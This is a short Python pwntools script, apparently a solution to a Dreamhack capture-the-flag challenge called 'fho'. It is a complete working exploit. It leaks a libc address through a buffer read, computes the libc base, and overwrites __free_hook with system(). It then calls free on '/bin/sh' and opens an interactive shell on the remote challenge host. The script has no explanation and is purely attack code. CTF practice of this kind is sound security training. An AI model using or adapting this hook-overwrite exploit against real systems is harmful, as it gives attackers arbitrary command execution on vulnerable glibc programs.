from pwn import *

port = 20494
rem = remote("host3.dreamhack.games", port)
elf = ELF("./fho/problem/fho")
lib = ELF("./fho/problem/libc-2.27.so")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

payload = b'A' * 0x48
rem.sendafter(b'Buf: ', payload)

rem.recvuntil(payload)
libcMain231_addr = u64(rem.recvn(6) + b'\x00' * 0x2)
libcMain231_offset = lib.symbols['__libc_start_main'] + 231
lib_base = libcMain231_addr - libcMain231_offset
hook_addr = lib_base + lib.symbols['__free_hook']
sys_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + list(lib.search('/bin/sh'))[0]

slog("lib", lib_base)
slog("hook", hook_addr)
slog("binsh", binsh_addr)

rem.sendlineafter(b'write: ', str(hook_addr).encode())
rem.sendlineafter(b'With: ', str(sys_addr).encode())
rem.sendlineafter(b'free: ', str(binsh_addr).encode())

rem.interactive()